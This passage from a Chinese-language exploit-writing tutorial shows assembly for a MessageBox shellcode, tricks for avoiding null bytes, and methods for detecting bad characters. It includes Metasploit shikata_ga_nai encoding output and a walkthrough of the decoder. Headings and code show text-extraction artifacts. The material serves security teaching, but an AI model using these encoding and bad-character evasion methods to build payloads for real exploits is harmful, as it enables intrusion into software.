MOVEAX,0x777777FF
MOVEBX,0x77191693
XOREAX,EBX ;EAXnowcontains0x006E616C
PUSHEAX ;pushittostack
PUSH0x65726f43;pushrestofstringtostack
MOVEBX,ESP ;savepointerto"Corelan"inEBX
MOVEAX,0x777777FF
MOVEDX,0x7757199E ;Don'tuseEBXbecauseitalreadycontains
;pointertopreviousstring
XOREAX,EDX ;EAXnowcontains0x00206E61
PUSHEAX ;pushittostack
PUSH0x6c65726f;pushrestofstringtostack
PUSH0x43207962
PUSH0x2064656e
PUSH0x7770206e
PUSH0x65656220
PUSH0x65766168
PUSH0x20756f59
MOVECX,ESP ;savepointerto"Youhavebeen..."inECX
XOREAX,EAX ;setEAXtozero
PUSHEAX ;putparametersonthestack
PUSHEBX
PUSHECX
PUSHEAX
PUSHEAX
MOVESI,0x7E4507EA
JMPESI ;MessageBoxA
XOREAX,EAX ;cleanup
PUSHEAX
MOVEAX,0x7c81CB12
JMPEAX ;ExitProcess(0)
记住这个技术--你将会在payload编码器部分看过它的改进实现。
方案5555：寄存器：33332222位---->>>>11116666位---->>>>8888位
我们在一个32位的CPU上运行Intelx86指令集。因此我们处理的寄存器都是32为对齐
的（4字节），它们会被涉及到用4字节，2字节或者1字节：EAX（扩大的...)是4字节的，
AX是2字节的，AL（低）或者AH（高）是1字节。
因此我们可以利用这个来避免null字节。
比如说你需要把1入栈。
PUSH0x1
字节码是这样的：
\x68\x01\x00\x00\x00
这个例子中你可以这样避免null字节：
将一个寄存器清零
将寄存器加1，用AL（来指向低字节）
将寄存器入栈
例子：
XOREAX,EAX
MOVAL,1
PUSHEAX
字节码：
\x31\xc0\xb0\x01\x50
我们来比较下这两个：
[BITS32]
PUSH0x1
INT3
XOREAX,EAX
MOVAL,1
PUSHEAX
INT3
两个字节码都是5字节，因此避免null字节并不是一定意味着将会增大shellcode的大小。
你明显可以再很多方法中用这个--举个例子，将一个字符覆盖为null字节，等等
方案6666：用可替代指令
前面的例子（push1）也可以写成这样：
XOREAX,EAX
INCEAX
PUSHEAX
\x31\xc0\x40\x50
（=>只有4个字节...因此你也可以创造性的将字节数减小）
或者你甚至也可以试试这个：
\x6A\x01
这也是push1并且只有两个字节...
方案7777：字符串：从nnnnuuuullllllll字节到空格&&&&nnnnuuuullllllll字节
如果你不得不将一个字符串入栈而是字符串使用null字节结束的，你也可以这样做：
写入字符串并且在末尾用空格（0x20）来使它是4字节对齐
加上null字节
例子：如果你需要将“Corelan”写入栈中，你可以这样做：
PUSH0x006e616c ;push"Corelan"tostack
PUSH0x65726f43
但是你也可以这样做：（用空格来代替null字节，然后将用一个寄存器将null字节入栈
XOREAX,EAX
PUSHEAX
PUSH0x206e616c ;push"Corelan"tostack
PUSH0x65726f43
结论：这只是处理null字节的很多方法中的一点点。这里列出来的一些只是告诉你一些当
你要处理null字节但又不想用（或者-无论什么原因-你不能）payload编码器的思路。
编码器：ppppaaaayyyyllllooooaaaadddd编码
当然，除了换掉个别的指令，你也可以用可以编码整个shellcode的编码技术。这种技术
通常被用来避免坏字符...实际上，null字节也可以被认为是坏字符。
因此，是开始写些关于payload编码的东西。
（PPPPaaaayyyyllllooooaaaadddd）编码器
编码器不只可以用来过滤掉null字节。它们大体上也可以过滤掉坏字节（或者克服字符
集限制）
坏字符不是shellcode特定的--他们是exploit特定的。他们是在你的payload执行之前其
他操作的结果。（举个例子用下划线代替空格，或者把输入转化成大写字母，或者null字符，
将会改变payload缓冲区因为它会被删节/阻断）
我们要怎样检测坏字符？
检测坏字符
检测坏字符的最好方法是将shellcode放在内存中，如果你的shellcode会遭受到坏字符的
限制。然后将它跟原始的shellcode对比一下，然后列出不同点。
你显然可以手动做这个（将内存中的字节跟原始的shellcode字节进行比较），但这会花
一会儿时间。
你也可以用可用的调试器插件：
windbg:byakugan(seeexploitwritingtutorialpart5)
或者ImmunityDebugger:pvefindaddr:
首先，将你的shellcode写入到一个文件中（pveWritebin.pl-看文章的之前部分）...例如，
写入c:\tmp\shellcode.bin。
接着，将ImmunityDebugger附加到你要exploit的应用程序中，将payload（包含shellcode）
放到这个应用程序中。
当应用程序崩溃（或者是因为你设置的断点而停下），运行下面的命令来比较文件中的
shellcode和内存中的shellcode：
!pvefindaddrcomparec:\tmp\shellcode
如果坏字符已经被找到的话（或者shellcode是被坏字节删节），ImmunityLog将会指出来。
如果你已经知道了坏字符是什么（根据应用程序的类型，输入，缓冲区转换等等），你可以
用一种不同的方法来看下你的shellcode会不会工作。
假设你已经找到你需要注意点坏字符是0x48,0x65,0x6C,0x6F,0x20,然后你可以用skylined的
beta3功能。你又需要一个 bin文件（写入到文件中的字节码），然后对bin文件运行下面的
命令：
beta3.py--badchars0x48,0x65,0x6C,0x6F,0x20shellcode.bin
如果这些坏字符被找到的话，他们在shellcode中的位置会被指出来。
编码器：MMMMeeeettttaaaassssppppllllooooiiiitttt
当payload中用到的数据字符集是被限制的时，需要一个编码器来克服这些限制。编码
器将会将原始的代码包起来，计划在动态执行时用解码器来重新产生原始的代码，或者修改
掉原始代码，因此它能够遵从给定的字符集限制。
最常用的shellcode编码器是Metasploit中的，和skylined（alpha2/alpha3）。
现在让我们看一下Metasploit编码器所做的和它们是怎么工作的（你可以再实际需要时从
中选择适合的）。
你可以通过运行./msfencode-l命令来列出所有的编码器。由于我是在win32平台下，我只
是去看那些写给x86的：
./msfencode-l-ax86
FrameworkEncoders(architectures:x86)
=======================================
Name Rank Description
---- ---- -----------
generic/none normal The"none"Encoder
x86/alpha_mixed low Alpha2AlphanumericMixedcaseEncoder
x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower manual AvoidUTF8/tolower
x86/call4_dword_xor normal Call+4DwordXOREncoder
x86/countdown normal Single-byte XOR Countdown Encoder
x86/fnstenv_mov normal Variable-length Fnstenv/movDwordXOREncoder
x86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoder
x86/nonalpha low Non-AlphaEncoder
x86/nonupper low Non-UpperEncoder
x86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit manual SingleStaticBit
x86/unicode_mixed manual Alpha2AlphanumericUnicodeMixedcaseEncoder
x86/unicode_upper manual Alpha2AlphanumericUnicodeUppercaseEncoder
Metasploit的默认编码器是shikata_ga_nai，因此我们就深入的研究下这个。
XXXX88886666////sssshhhhiiiikkkkaaaattttaaaa____ggggaaaa____nnnnaaaaiiii
我们用原始的messageshellcode（那个有null字节的），编码器用shikata_ga_nai，过滤掉
null字节：
原始shellcode：
C:\shellcode>perlpveReadbin.plmsgbox.bin
Readingmsgbox.bin
Read78bytes
"\x68\x6c\x61\x6e\x00\x68\x43\x6f"
"\x72\x65\x89\xe3\x68\x61\x6e\x20"
"\x68\x6e\x20\x70\x77\x68\x20\x62"
"\x65\x65\x68\x68\x61\x76\x65\x68"
"\x59\x6f\x75\x20\x89\xe1\x31\xc0"
"\x50\x53\x51\x50\x50\xbe\xea\x07"
"\x45\x7e\xff\xe6\x31\xc0\x50\xb8"
"\x12\xcb\x81\x7c\xff\xe0";
我把这些字节写入/pentest/exploits/shellcode.bin然后用shikata_ga_nai对它们编码：
./msfencode-b'\x00'-i/pentest/exploits/shellcode.bin-tc
[*]x86/shikata_ga_naisucceededwithsize105(iteration=1)
unsignedcharbuf[]=
"\xdb\xc9\x29\xc9\xbf\x63\x07\x01\x58\xb1\x14\xd9\x74\x24\xf4"
"\x5b\x83\xc3\x04\x31\x7b\x15\x03\x7b\x15\x81\xf2\x69\x34\x24"
"\x93\x69\xac\xe5\x04\x18\x49\x60\x39\xb4\xf0\x1c\x9e\x45\x9b"
"\x8f\xac\x20\x37\x27\x33\xd2\xe7\xf4\xdb\x4a\x8d\x9e\x3b\xfb"
"\x23\x7e\x4c\x8c\xd3\x5e\xce\x17\x41\xf6\x66\xb9\xff\x63\x1f"
"\x60\x6f\x1e\xff\x1b\x8e\xd1\x3f\x4b\x02\x40\x90\x3c\x1a\x88"
"\x17\xf8\x1c\xb3\xfe\x33\x21\x1b\x47\x21\x6a\x1a\xcb\xb9\x8c";
（当输出跟你的系统上的不一样时不要吃惊--你会在一会儿将会理解为什么会不同）
（注意：编码器把shellcode从78字节增加到105）
加载到调试器中（用testshellcode.c应用程序），编码后的shellcode看起来是这样的：
当你步入这些指令时，首先一个XOR指令被执行（XORDWORDPTRDS:[EBX+15],EDI），
下面的指令（XOREDX，93243469）将会变成一个LOOPD指令。
从那点往前看，解码器将会循环然后重新产生原始的代码...这很好，但这个编码器/解码器是
如何真正工作的？
这个编码器做两件事：
1、它会在原始的shellcode中做XOR/ADD/SUB操作。在这个例子里，XOR操作从初始值
为58010763（在解码器中被放在EDI中）处开始。被XOR后的字节被写入解码器的循环后。
2、它会产生一个重新联合/重新生成原始代码的解码器，然后写在解码循环的后面。这个解
码器会预先写好异或指令。同时，这两个组件组成编码后payload。
当解码器运行时，下面的事会发生：
FCMOVNEST，ST（1）（FPU指令，来配合FSTENV工作--看后面）
SUBECX，ECX
MOVEDI，58010763：XOR操作要用到的初始值
MOVCL，14：将ECX设为00000014（当解码时用来跟踪进程）。一次会读4字节，因
此14h×4=80字节（我们的原始shellcode是78字节，所以这个有意义）。
FSTENV PTR SS：[ESP-c]：这个结果是得到解码器第一个FPU指令的地址（这个例
子中的FCMOVNE）。这个指令能工作的必备条件是前面至少有个FPU指令被执行--不管哪